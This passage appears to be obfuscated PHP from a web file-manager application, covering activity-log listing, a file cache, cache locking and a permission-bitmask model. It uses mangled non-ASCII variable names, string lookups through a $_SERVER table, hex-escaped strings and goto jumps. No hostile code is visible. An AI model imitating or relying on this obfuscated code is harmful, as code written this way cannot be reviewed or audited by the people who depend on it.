$„‡Ÿ†÷‹; } private function ipAddress(&$Á·õâ®¢) { $½‹Ìúã— =& $_SERVER[ñˆ‹ß¿÷]; if (!empty($Á·õâ®¢[$½‹Ìúã—[2252]])) { $ÕÑƒ¹Œ = IpLocation::get($Á·õâ®¢[$½‹Ìúã—[2252]]); } else { $ÕÑƒ¹Œ = LNG($½‹Ìúã—[2255]); } $Á·õâ®¢[$½‹Ìúã—[2256]] = $ÕÑƒ¹Œ; } private function descZipDownload($Ñ—ş¨ù¼, &$îûŒ¤ ) { $‹öìÑà =& $_SERVER[ñˆ‹ß¿÷]; if (!isset($Ñ—ş¨ù¼[$‹öìÑà[2257]])) { return; } $š€õâ‘è = json_decode($Ñ—ş¨ù¼[$‹öìÑà[2257]], !0); foreach ($š€õâ‘è as $¢‹Úê) { try { $–§åÊæó = IO::infoFull($¢‹Úê[$‹öìÑà[84]]); } catch (Exception $»å—óõ²) { continue; } $Ñ—ş¨ù¼[$‹öìÑà[84]] = $¢‹Úê[$‹öìÑà[84]]; $îûŒ¤ [] = $Ñ—ş¨ù¼[$‹öìÑà[402]] = $–§åÊæó[$‹öìÑà[402]]; $îûŒ¤ [] = $Ñ—ş¨ù¼[$‹öìÑà[2059]] = $–§åÊæó[$‹öìÑà[432]]; break; } return $Ñ—ş¨ù¼; } private function getSourceList(&$©ò¿ñãø) { $¨ŒüŒ”Ó =& $_SERVER[ñˆ‹ß¿÷]; $©ò‰±º = array(); foreach ($©ò¿ñãø as $İ»€ãû => $ÅÏÅ£“”) { $§’´úÍ› = json_decode($ÅÏÅ£“”[$¨ŒüŒ”Ó[453]], !0); if ($ÅÏÅ£“”[$¨ŒüŒ”Ó[33]] == $¨ŒüŒ”Ó[1810]) { $§’´úÍ› = $this->descZipDownload($§’´úÍ›, $©ò‰±º); $©ò¿ñãø[$İ»€ãû][$¨ŒüŒ”Ó[453]] = json_encode($§’´úÍ›); continue; } if (strpos($ÅÏÅ£“”[$¨ŒüŒ”Ó[33]], $¨ŒüŒ”Ó[2061]) !== 0) { if (!isset($§’´úÍ›[$¨ŒüŒ”Ó[84]]) || strpos($ÅÏÅ£“”[$¨ŒüŒ”Ó[33]], $¨ŒüŒ”Ó[2258]) !== 0) { continue; } try { $Øïö¶øĞ = IO::infoFull($§’´úÍ›[$¨ŒüŒ”Ó[84]]); } catch (Exception $›û©¨ŒŒ) { continue; } $©ò‰±º[] = $§’´úÍ›[$¨ŒüŒ”Ó[402]] = $Øïö¶øĞ[$¨ŒüŒ”Ó[402]]; $©ò‰±º[] = $§’´úÍ›[$¨ŒüŒ”Ó[2059]] = $Øïö¶øĞ[$¨ŒüŒ”Ó[432]]; $©ò¿ñãø[$İ»€ãû][$¨ŒüŒ”Ó[453]] = json_encode($§’´úÍ›); continue; } $©ò‰±º[] = $§’´úÍ›[$¨ŒüŒ”Ó[402]]; $©ò‰±º[] = $§’´úÍ›[$¨ŒüŒ”Ó[2059]]; if ($§’´úÍ›[$¨ŒüŒ”Ó[33]] == $¨ŒüŒ”Ó[557]) { $©ò‰±º[] = $§’´úÍ›[$¨ŒüŒ”Ó[453]][$¨ŒüŒ”Ó[1167]]; $©ò‰±º[] = $§’´úÍ›[$¨ŒüŒ”Ó[453]][$¨ŒüŒ”Ó[1168]]; } if ($§’´úÍ›[$¨ŒüŒ”Ó[33]] == $¨ŒüŒ”Ó[2069]) { $©ò‰±º[] = $§’´úÍ›[$¨ŒüŒ”Ó[453]][$¨ŒüŒ”Ó[402]]; } } if (!$©ò‰±º) { return array(); } return Model($¨ŒüŒ”Ó[832])->sourceListInfo($©ò‰±º, !0); } private function logList($ˆâü¤ëÁ) { $ãƒóìš¼ =& $_SERVER[ñˆ‹ß¿÷]; $ì£İä¬’ = array_to_keyvalue($ˆâü¤ëÁ, $ãƒóìš¼[12], $ãƒóìš¼[1664]); $¿“Ü³üæ = Model($ãƒóìš¼[535])->userListInfo(array_unique($ì£İä¬’)); $Îú‘ö™° = $this->getSourceList($ˆâü¤ëÁ); $³ªÏ¸ = $this->typeAll(); $„¬ğÀå = array(); $ş¯‡¥Ãä = array(); foreach ($ˆâü¤ëÁ as $—ĞÜÙô => $Í¦½Ä¦Ô) { $Îıë­Õ = $Í¦½Ä¦Ô[$ãƒóìš¼[33]]; $Ñ€•³ı‚ = isset($¿“Ü³üæ[$Í¦½Ä¦Ô[$ãƒóìš¼[1664]]]) ? $¿“Ü³üæ[$Í¦½Ä¦Ô[$ãƒóìš¼[1664]]] : !1; $Ÿ÷ó®Ë = strpos($Îıë­Õ, $ãƒóìš¼[2259]) === 0 ? LNG($ãƒóìš¼[2260]) : LNG($ãƒóìš¼[2255]); $Í¦½Ä¦Ô[$ãƒóìš¼[32]] = isset($Ñ€•³ı‚[$ãƒóìš¼[32]]) ? $Ñ€•³ı‚[$ãƒóìš¼[32]] : LNG($ãƒóìš¼[2255]); $Í¦½Ä¦Ô[$ãƒóìš¼[542]] = isset($Ñ€•³ı‚[$ãƒóìš¼[542]]) ? $Ñ€•³ı‚[$ãƒóìš¼[542]] : $ãƒóìš¼[12]; $Í¦½Ä¦Ô[$ãƒóìš¼[1563]] = isset($³ªÏ¸[$Îıë­Õ]) ? $³ªÏ¸[$Îıë­Õ] : $Ÿ÷ó®Ë; $Í¦½Ä¦Ô[$ãƒóìš¼[2004]] = $Ñ€•³ı‚; $ÕÏÏÅÂõ = json_decode($Í¦½Ä¦Ô[$ãƒóìš¼[453]], !0); $Í¦½Ä¦Ô[$ãƒóìš¼[2252]] = isset($ÕÏÏÅÂõ[$ãƒóìš¼[2252]]) ? $ÕÏÏÅÂõ[$ãƒóìš¼[2252]] : $ãƒóìš¼[12]; $Í¦½Ä¦Ô[$ãƒóìš¼[2256]] = IpLocation::get($Í¦½Ä¦Ô[$ãƒóìš¼[2252]]); if (strpos($Îıë­Õ, $ãƒóìš¼[2061]) === 0 || isset($ÕÏÏÅÂõ[$ãƒóìš¼[2059]])) { $ÕÏÏÅÂõ[$ãƒóìš¼[86]] = $Îú‘ö™°[$ÕÏÏÅÂõ[$ãƒóìš¼[402]]]; $ÕÏÏÅÂõ[$ãƒóìš¼[2074]] = $Îú‘ö™°[$ÕÏÏÅÂõ[$ãƒóìš¼[2059]]]; if ($ÕÏÏÅÂõ[$ãƒóìš¼[33]] == $ãƒóìš¼[557]) { $ÕÏÏÅÂõ[$ãƒóìš¼[453]][$ãƒóìš¼[1167]] = $Îú‘ö™°[$ÕÏÏÅÂõ[$ãƒóìš¼[453]][$ãƒóìš¼[1167]]]; $ÕÏÏÅÂõ[$ãƒóìš¼[453]][$ãƒóìš¼[1168]] = $Îú‘ö™°[$ÕÏÏÅÂõ[$ãƒóìš¼[453]][$ãƒóìš¼[1168]]]; } if ($ÕÏÏÅÂõ[$ãƒóìš¼[33]] == $ãƒóìš¼[2069]) { $ÕÏÏÅÂõ[$ãƒóìš¼[453]][$ãƒóìš¼[402]] = $Îú‘ö™°[$ÕÏÏÅÂõ[$ãƒóìš¼[453]][$ãƒóìš¼[402]]]; } if ($ÕÏÏÅÂõ[$ãƒóìš¼[33]] == $ãƒóìš¼[1805]) { $ÕÏÏÅÂõ[$ãƒóìš¼[2074]] = $ÕÏÏÅÂõ[$ãƒóìš¼[86]]; $ÕÏÏÅÂõ[$ãƒóìš¼[2059]] = $ÕÏÏÅÂõ[$ãƒóìš¼[2074]][$ãƒóìš¼[402]]; $ÕÏÏÅÂõ[$ãƒóìš¼[86]] = !1; $ÕÏÏÅÂõ[$ãƒóìš¼[402]] = $ãƒóìš¼[12]; } if ($ÕÏÏÅÂõ[$ãƒóìš¼[86]] && $ÕÏÏÅÂõ[$ãƒóìš¼[86]][$ãƒóìš¼[411]] == $ãƒóìš¼[1283]) { $ş¯‡¥Ãä[] = $Í¦½Ä¦Ô[$ãƒóìš¼[399]]; unset($ˆâü¤ëÁ[$—ĞÜÙô]); continue; } if ($ÕÏÏÅÂõ[$ãƒóìš¼[2074]] && $ÕÏÏÅÂõ[$ãƒóìš¼[2074]][$ãƒóìš¼[411]] == $ãƒóìš¼[1283]) { $ş¯‡¥Ãä[] = $Í¦½Ä¦Ô[$ãƒóìš¼[399]]; unset($ˆâü¤ëÁ[$—ĞÜÙô]); continue; } } $Í¦½Ä¦Ô[$ãƒóìš¼[453]] = $ÕÏÏÅÂõ; unset($Í¦½Ä¦Ô[$ãƒóìš¼[2261]]); $„¬ğÀå[] = $Í¦½Ä¦Ô; } $this->clearSystemPathLog($ş¯‡¥Ãä); return $„¬ğÀå; } private function clearSystemPathLog($¬Õº³¡²) { $»Ã‡­™° =& $_SERVER[ñˆ‹ß¿÷]; if (count($¬Õº³¡²) == 0) { return; } $ƒ•¿Ø¾ = array($»Ã‡­™°[399] => array($»Ã‡­™°[7], array_unique($¬Õº³¡²))); $this->where($ƒ•¿Ø¾)->delete(); } public function deviceList($ Áƒ˜ÅÜ, $ã¥É¨Ùå = 0) { $’¸ì°”¢ =& $_SERVER[ñˆ‹ß¿÷]; $äÈÄ½Ş = array($’¸ì°”¢[1664] => $ Áƒ˜ÅÜ, $’¸ì°”¢[200] => array($’¸ì°”¢[1021], $ã¥É¨Ùå), $’¸ì°”¢[33] => $’¸ì°”¢[1779]); $ûÂŒ³ƒ¡ = array(); $ öÆ¡€ç = $this->field($’¸ì°”¢[2262])->where($äÈÄ½Ş)->order($’¸ì°”¢[2072])->limit(50)->select(); foreach ($ öÆ¡€ç as $ûğÂáú¾ => $Èõõ‰Ãë) { if ($ûğÂáú¾ > 0 && abs($Èõõ‰Ãë[$’¸ì°”¢[200]] - $ öÆ¡€ç[$ûğÂáú¾ - 1][$’¸ì°”¢[200]]) < 5) { continue; } $‘ÙÚÕ = json_decode($Èõõ‰Ãë[$’¸ì°”¢[453]], !0); $Èõõ‰Ãë[$’¸ì°”¢[2252]] = isset($‘ÙÚÕ[$’¸ì°”¢[2252]]) ? $‘ÙÚÕ[$’¸ì°”¢[2252]] : $’¸ì°”¢[12]; unset($‘ÙÚÕ[$’¸ì°”¢[2252]]); $÷Œš¶¥Í = $this->deviceType($‘ÙÚÕ[$’¸ì°”¢[2062]]); if (isset($ûÂŒ³ƒ¡[$÷Œš¶¥Í])) { continue; } $Èõõ‰Ãë[$’¸ì°”¢[2256]] = IpLocation::get($Èõõ‰Ãë[$’¸ì°”¢[2252]]); $Èõõ‰Ãë[$’¸ì°”¢[453]] = $‘ÙÚÕ; $ûÂŒ³ƒ¡[$÷Œš¶¥Í] = $Èõõ‰Ãë; } return array_values($ûÂŒ³ƒ¡); } public function deviceType($¬éŞÛø) { return $¬éŞÛø; } } goto E‚óÄ‰¦¨™; c‹ÈÑÇõ¹: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($•«°Œ, $Ãı¦·˜) { $Ş€ˆõçŠ =& $_SERVER[ñˆ‹ß¿÷]; $this->cachePath = $•«°Œ[$Ş€ˆõçŠ[84]]; $this->prefix = $Ş€ˆõçŠ[841]; $this->cacheTime = $Ãı¦·˜; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($œÑ¨¬ÛŸ) { $İàóğÙÜ =& $_SERVER[ñˆ‹ß¿÷]; $œÑ¨¬ÛŸ = str_replace(array($İàóğÙÜ[842], $İàóğÙÜ[97], $İàóğÙÜ[73]), $İàóğÙÜ[843], $œÑ¨¬ÛŸ); return $this->cachePath . $İàóğÙÜ[844] . $œÑ¨¬ÛŸ . $İàóğÙÜ[845]; } public function set($ÌÃÇù—, $€Óø×ĞÛ, $Ñ›øºÚ” = false) { $úùø¶³Ë = $this->getFile($ÌÃÇù—); if (file_put_contents($úùø¶³Ë, $this->prefix . $€Óø×ĞÛ, LOCK_EX)) { @touch($úùø¶³Ë, intval(time() + $Ñ›øºÚ”)); clearstatcache(); return !0; } @unlink($úùø¶³Ë); return !1; } public function get($ñáÊ¤îú) { $çüä¼ = $this->getFile($ñáÊ¤îú); if (file_exists($çüä¼) && filemtime($çüä¼) < time()) { @unlink($çüä¼); return !1; } $«Š¥ˆŸß = @file_get_contents($çüä¼); return substr($«Š¥ˆŸß, strlen($this->prefix)); } public function remove($¯Å¥´á) { $»Ü„’Áİ = $this->getFile($¯Å¥´á); return @unlink($»Ü„’Áİ); } public function deleteAll() { $ÈÔçÁäâ =& $_SERVER[ñˆ‹ß¿÷]; $í…âÛÊ = scandir($this->cachePath); foreach ($í…âÛÊ as $¦õìÜƒ¬) { $½·ÒÏ¾ = $this->cachePath . $¦õìÜƒ¬; if (strpos($½·ÒÏ¾, $ÈÔçÁäâ[845]) && strpos($½·ÒÏ¾, $ÈÔçÁäâ[846])) { @unlink($½·ÒÏ¾); } } } public function clearTimeout() { $¯¬õÊ³¢ =& $_SERVER[ñˆ‹ß¿÷]; $Šè»‰ö— = scandir($this->cachePath); foreach ($Šè»‰ö— as $·ş¼¶Ä‹) { $´ÑÕŸĞÖ = $this->cachePath . $·ş¼¶Ä‹; if (strpos($´ÑÕŸĞÖ, $¯¬õÊ³¢[845]) && strpos($´ÑÕŸĞÖ, $¯¬õÊ³¢[846]) && filemtime($´ÑÕŸĞÖ) < time()) { @unlink($´ÑÕŸĞÖ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $­ÕÏŒÚ¾ =& $_SERVER[ñˆ‹ß¿÷]; if (self::$handle) { return self::$handle; } $ïô¤ï“‹ = $GLOBALS[$­ÕÏŒÚ¾[6]][$­ÕÏŒÚ¾[349]]; self::$timeout = $ïô¤ï“‹[$­ÕÏŒÚ¾[847]] ? $ïô¤ï“‹[$­ÕÏŒÚ¾[847]] : 10; $¢ñ½œ°ø = _get($GLOBALS[$­ÕÏŒÚ¾[6]], $­ÕÏŒÚ¾[848]); $€ÁÜ†î = $ïô¤ï“‹[$­ÕÏŒÚ¾[834]] ? $ïô¤ï“‹[$­ÕÏŒÚ¾[834]] : $­ÕÏŒÚ¾[199]; if ($€ÁÜ†î == $­ÕÏŒÚ¾[21] && $¢ñ½œ°ø == $­ÕÏŒÚ¾[13]) { $€ÁÜ†î = $­ÕÏŒÚ¾[199]; } switch ($€ÁÜ†î) { case $­ÕÏŒÚ¾[837]: self::$handle = new CacheLockRedis(); break; case $­ÕÏŒÚ¾[838]: self::$handle = new CacheLockMemcached(); break; case $­ÕÏŒÚ¾[21]: self::$handle = new CacheLockDatabase(); break; case $­ÕÏŒÚ¾[199]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($­ÕÏŒÚ¾[849], $­ÕÏŒÚ¾[850]); } return self::$handle; } private static function key($£Ğ†€Âê) { return $_SERVER[ñˆ‹ß¿÷][851] . Cache::key($£Ğ†€Âê); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¬‚²¢¢Ö = '') { self::$errorMsg = $¬‚²¢¢Ö; } public static function lockGlobal($ô°ŞŸÕ¯, $ùú¬•È­) { return self::lock($ô°ŞŸÕ¯, $ùú¬•È­, !0); } public static function lock($·šÉùÉğ, $û¤“š¹Ğ = false, $°ŒøùÛö = false) { $ÆèŞãøù =& $_SERVER[ñˆ‹ß¿÷]; $Ãô¬ˆ¸ = self::init(); $¬³©×• = self::key($·šÉùÉğ); $û¤“š¹Ğ = $û¤“š¹Ğ ? $û¤“š¹Ğ : self::$timeout; $ä–¼âÜ› = $Ãô¬ˆ¸->lock($¬³©×•, $û¤“š¹Ğ); $ß«ÃÎÑ” = timeFloat(); if (!$ä–¼âÜ›) { $ÔÅ…€“— = "\x6c\x6f\143\x6b\x20\x65\x72\x72\157\x72\73\153\145\171\x3d{$·šÉùÉğ}\73\164\151\x6d\x65\x3d{$û¤“š¹Ğ}\x3b" . self::$errorMsg . $ÆèŞãøù[71] . get_caller_msg(); $¤†Úüá© = LNG($ÆèŞãøù[852]) . "\50{$û¤“š¹Ğ}\x73\x29\x2e" . LNG($ÆèŞãøù[853]); $¤†Úüá© .= $ÆèŞãøù[854]; if (is_string(self::$errorMsg) && self::$errorMsg) { $¤†Úüá© = $¤†Úüá© . $ÆèŞãøù[855] . self::$errorMsg; } write_log($ÔÅ…€“—, $ÆèŞãøù[850]); show_json($¤†Úüá©, !1); } if (!$°ŒøùÛö) { self::$lockItem[$¬³©×•] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ÀÃÄç«› = number_format(timeFloat() - $ß«ÃÎÑ”, 3); write_log($ÆèŞãøù[856] . $·šÉùÉğ . $ÆèŞãøù[857] . $ÀÃÄç«›, $ÆèŞãøù[850]); } return $ä–¼âÜ›; } public static function lockGet($ş¦«Ìè) { $á—ÍıÄñ = self::key($ş¦«Ìè); if (self::$lockItem[$á—ÍıÄñ]) { return self::$lockItem[$á—ÍıÄñ]; } return self::init()->lockGet($á—ÍıÄñ); } public static function unlock($†Ä²ó´Ÿ) { $æ¾Ü¤ßÜ =& $_SERVER[ñˆ‹ß¿÷]; $¢Ïû£‰İ = self::key($†Ä²ó´Ÿ); self::$lockItem[$¢Ïû£‰İ] = null; self::init()->unlock($¢Ïû£‰İ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($æ¾Ü¤ßÜ[858] . $†Ä²ó´Ÿ, $æ¾Ü¤ßÜ[850]); } return; } public static function unlockRuntime() { $â¾¬‡ãö =& $_SERVER[ñˆ‹ß¿÷]; $îøİÕ›Û = self::init(); $âıåˆŸĞ = !1; foreach (self::$lockItem as $ÒæÊ´Îà => $•Á–®ßš) { if (!$•Á–®ßš) { continue; } $îøİÕ›Û->unlock($ÒæÊ´Îà); if (!$âıåˆŸĞ) { $âıåˆŸĞ = !0; write_log($â¾¬‡ãö[859] . $ÒæÊ´Îà . $â¾¬‡ãö[71] . get_caller_msg(), $â¾¬‡ãö[850]); continue; } write_log($â¾¬‡ãö[859] . $ÒæÊ´Îà, $â¾¬‡ãö[850]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $“¦ãö…¼ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($â¾¬‡ãö[860] . $“¦ãö…¼ . $â¾¬‡ãö[861] . ACTION, $â¾¬‡ãö[850]); } } public static function fileLock($ÛéÉ™¤²) { $ı·„œÙ¹ =& $_SERVER[ñˆ‹ß¿÷]; if (!$GLOBALS[$ı·„œÙ¹[862]]) { $GLOBALS[$ı·„œÙ¹[862]] = array(); } $GLOBALS[$ı·„œÙ¹[862]][$ÛéÉ™¤²] = !1; $µà§Ë¤– = fopen(DATA_PATH . $ÛéÉ™¤² . $ı·„œÙ¹[863], $ı·„œÙ¹[864]); if (!$µà§Ë¤–) { return !1; } $GLOBALS[$ı·„œÙ¹[862]][$ÛéÉ™¤²] = $µà§Ë¤–; if (flock($µà§Ë¤–, LOCK_EX)) { return !0; } self::unlock($ÛéÉ™¤²); show_json($ı·„œÙ¹[865], !1); return !1; } public static function fileUnlock($µÆşì¿ñ) { $ÄÕÕ‰« =& $_SERVER[ñˆ‹ß¿÷]; $×£ö¢¦Ù = $GLOBALS[$ÄÕÕ‰«[862]][$µÆşì¿ñ]; if (!$×£ö¢¦Ù) { return; } $GLOBALS[$ÄÕÕ‰«[862]][$µÆşì¿ñ] = !1; flock($×£ö¢¦Ù, LOCK_UN); fclose($×£ö¢¦Ù); } public static function fileUnlockAll() { $„÷²Ôê‚ =& $_SERVER[ñˆ‹ß¿÷]; if (!$GLOBALS[$„÷²Ôê‚[862]]) { return; } foreach ($GLOBALS[$„÷²Ôê‚[862]] as $¢åª”– => $ÌÓ÷Ó˜€) { if (!$ÌÓ÷Ó˜€) { continue; } $GLOBALS[$„÷²Ôê‚[862]][$¢åª”–] = !1; flock($ÌÓ÷Ó˜€, LOCK_UN); fclose($ÌÓ÷Ó˜€); } $GLOBALS[$„÷²Ôê‚[862]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto D†ñ‘§øÀæ; fÁÈ„ÆÀ±¨: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $˜‡ÂúƒÓ =& $_SERVER[ñˆ‹ß¿÷]; $§¢ÄÂÒ = array(array($˜‡ÂúƒÓ[420] => LNG($˜‡ÂúƒÓ[1837]), $˜‡ÂúƒÓ[1838] => $˜‡ÂúƒÓ[1839], $˜‡ÂúƒÓ[1840] => 1, $˜‡ÂúƒÓ[1841] => 1, $˜‡ÂúƒÓ[1842] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($˜‡ÂúƒÓ[420] => LNG($˜‡ÂúƒÓ[1843]), $˜‡ÂúƒÓ[1838] => $˜‡ÂúƒÓ[1844], $˜‡ÂúƒÓ[1840] => 2, $˜‡ÂúƒÓ[1841] => 1, $˜‡ÂúƒÓ[1842] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($˜‡ÂúƒÓ[420] => LNG($˜‡ÂúƒÓ[1845]), $˜‡ÂúƒÓ[1838] => $˜‡ÂúƒÓ[1846], $˜‡ÂúƒÓ[1840] => 3, $˜‡ÂúƒÓ[1841] => 1, $˜‡ÂúƒÓ[1842] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($˜‡ÂúƒÓ[420] => LNG($˜‡ÂúƒÓ[1847]), $˜‡ÂúƒÓ[1838] => $˜‡ÂúƒÓ[1848], $˜‡ÂúƒÓ[1840] => 4, $˜‡ÂúƒÓ[1841] => 1, $˜‡ÂúƒÓ[1842] => self::AUTH_SHOW | self::AUTH_VIEW), array($˜‡ÂúƒÓ[420] => LNG($˜‡ÂúƒÓ[1849]), $˜‡ÂúƒÓ[1838] => $˜‡ÂúƒÓ[1850], $˜‡ÂúƒÓ[1840] => 5, $˜‡ÂúƒÓ[1841] => 1, $˜‡ÂúƒÓ[1842] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($˜‡ÂúƒÓ[420] => LNG($˜‡ÂúƒÓ[1851]), $˜‡ÂúƒÓ[1838] => $˜‡ÂúƒÓ[1852], $˜‡ÂúƒÓ[1840] => 6, $˜‡ÂúƒÓ[1841] => 1, $˜‡ÂúƒÓ[1842] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($˜‡ÂúƒÓ[420] => LNG($˜‡ÂúƒÓ[1853]), $˜‡ÂúƒÓ[1838] => $˜‡ÂúƒÓ[1854], $˜‡ÂúƒÓ[1840] => 7, $˜‡ÂúƒÓ[1841] => 1, $˜‡ÂúƒÓ[1842] => 0)); return $§¢ÄÂÒ; } public static function authCheck($›ßõéñË, $ŞÓËØéÈ) { $ÏÌô—±§ =& $_SERVER[ñˆ‹ß¿÷]; $›ßõéñË = intval($›ßõéñË); if ($GLOBALS[$ÏÌô—±§[503]] && $GLOBALS[$ÏÌô—±§[6]][$ÏÌô—±§[1855]]) { return !0; } if ($›ßõéñË <= 0) { return !1; } if (($›ßõéñË & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($›ßõéñË & $ŞÓËØéÈ); } public static function authCheckShow($¯òµ•ŞÍ) { return self::authCheck($¯òµ•ŞÍ, self::AUTH_SHOW); } public static function authCheckView($ÁÏ²œÛ) { return self::authCheck($ÁÏ²œÛ, self::AUTH_VIEW); } public static function authCheckDownload($“„¶¡áŞ) { return self::authCheck($“„¶¡áŞ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ò–ş­è) { return self::authCheck($ò–ş­è, self::AUTH_UPLOAD); } public static function authCheckEdit($ƒ¡ºÏƒ¯) { return self::authCheck($ƒ¡ºÏƒ¯, self::AUTH_EDIT); } public static function authCheckRemove($ÇÍ·Ö) { return self::authCheck($ÇÍ·Ö, self::AUTH_REMOVE); } public static function authCheckShare($¹¡ıÍÈ“) { return self::authCheck($¹¡ıÍÈ“, self::AUTH_SHARE); } public static function authCheckComment($Ğ¯ÁÕ—›) { return self::authCheck($Ğ¯ÁÕ—›, self::AUTH_COMMENT); } public static function authCheckEvent($Õâ½‘¶) { return self::authCheck($Õâ½‘¶, self::AUTH_EVENT); } public static function authCheckRoot($™ÕÏƒ‰) { return self::authCheck($™ÕÏƒ‰, self::AUTH_ROOT); } public static function authCheckAction($º¯ä×–, $Üò•Ï€¸) { $øùùê˜¨ =& $_SERVER[ñˆ‹ß¿÷]; $€ş­± = array($øùùê˜¨[1856] => self::AUTH_VIEW, $øùùê˜¨[1206] => self::AUTH_DOWNLOAD, $øùùê˜¨[107] => self::AUTH_UPLOAD, $øùùê˜¨[1806] => self::AUTH_EDIT, $øùùê˜¨[1805] => self::AUTH_REMOVE, $øùùê˜¨[1816] => self::AUTH_SHARE, $øùùê˜¨[354] => self::AUTH_COMMENT, $øùùê˜¨[1652] => self::AUTH_EVENT, $øùùê˜¨[1857] => self::AUTH_ROOT); if (!isset($€ş­±[$Üò•Ï€¸])) { return; } $†‹µ©®í = $€ş­±[$Üò•Ï€¸]; $º¯ä×– = intval($º¯ä×–); if ($º¯ä×– <= 0) { return !1; } if (($º¯ä×– & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($º¯ä×– & $†‹µ©®í); } public static function authDisable($êİ¬ÖÈ­, $Ø½Û‹“Ğ) { if (intval($êİ¬ÖÈ­) <= 0) { return 0; } return intval($êİ¬ÖÈ­) & ~$Ø½Û‹“Ğ; } public $optionType = "\x53\x79\x73\164\x65\x6d\x2e\163\157\165\x72\x63\145\x41\x75\164\x68\x4c\151\163\x74"; public $field = array("\156\x61\x6d\x65", "\141\x75\164\150", "\154\141\142\145\154", "\144\x69\x73\160\154\x61\x79", "\x73\x79\163\164\x65\155", "\163\x6f\x72\x74"); public function initData() { $Û±äö“ı = $this->authDefault(); foreach ($Û±äö“ı as $àÃÌËê) { $this->add($àÃÌËê); } } public function findAuth($ÍÌŞ…ë…, $åˆü“äÙ) { $ÆŒªÛ„Æ =& $_SERVER[ñˆ‹ß¿÷]; $Çç¨Óú = parent::listData(); foreach ($Çç¨Óú as $É¬®­òØ) { $‰…ìıÍ = intval($É¬®­òØ[$ÆŒªÛ„Æ[413]]); if ($‰…ìıÍ <= 0 || $É¬®­òØ[$ÆŒªÛ„Æ[1858]] == 0) { continue; } if (($‰…ìıÍ & $ÍÌŞ…ë…) != $ÍÌŞ…ë…) { continue; } if (($‰…ìıÍ & $åˆü“äÙ) != 0) { continue; } return $É¬®­òØ[$ÆŒªÛ„Æ[399]]; } return !1; } public function findAuthReadOnly() { $£ÊŠÖå = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $Ï¬æ×”¼ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($£ÊŠÖå, $Ï¬æ×”¼); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $íÄª§»û =& $_SERVER[ñˆ‹ß¿÷]; $Ê²›ˆşú = parent::listData(); $™Ëéó”¿ = !1; foreach ($Ê²›ˆşú as $¤ÂË¿¼É) { if ($¤ÂË¿¼É[$íÄª§»û[413]] <= 0 || $¤ÂË¿¼É[$íÄª§»û[1858]] == $íÄª§»û[197]) { continue; } if (!$™Ëéó”¿) { $™Ëéó”¿ = $¤ÂË¿¼É; continue; } if ($™Ëéó”¿[$íÄª§»û[413]] > $¤ÂË¿¼É[$íÄª§»û[413]]) { $™Ëéó”¿ = $¤ÂË¿¼É; } } return $™Ëéó”¿ ? $™Ëéó”¿[$íÄª§»û[399]] : $íÄª§»û[12]; } public function listData($ˆ¹‰¿ = false, $ãâª´Í = "\163\x6f\162\x74", $é®³Î¤‚ = false) { return parent::listData($ˆ¹‰¿, $ãâª´Í, $é®³Î¤‚); } public function update($õ£Éõ¹ , $Ûç¦º³™) { $œ†Âí” =& $_SERVER[ñˆ‹ß¿÷]; $„Š¢­ÄÓ = parent::listData($õ£Éõ¹ ); $£Ìà©ãÜ = $this->findByName($Ûç¦º³™[$œ†Âí”[32]]); if (!$„Š¢­ÄÓ || $£Ìà©ãÜ && $£Ìà©ãÜ[$œ†Âí”[399]] != $„Š¢­ÄÓ[$œ†Âí”[399]]) { return !1; } $this->filterAuth($Ûç¦º³™[$œ†Âí”[413]]); return parent::update($õ£Éõ¹ , $Ûç¦º³™); } public function remove($Á¨öúÏÓ) { $åÆË‡ÌÇ = parent::listData($Á¨öúÏÓ); if (!$åÆË‡ÌÇ || $åÆË‡ÌÇ[$_SERVER[ñˆ‹ß¿÷][1283]]) { return !1; } return parent::remove($Á¨öúÏÓ); } public function add($‚ÚãÃÔï = array()) { $ûÌå²É =& $_SERVER[ñˆ‹ß¿÷]; if ($this->findByName($‚ÚãÃÔï[$ûÌå²É[32]])) { return !1; } $äéââß¯ = array($ûÌå²É[32] => 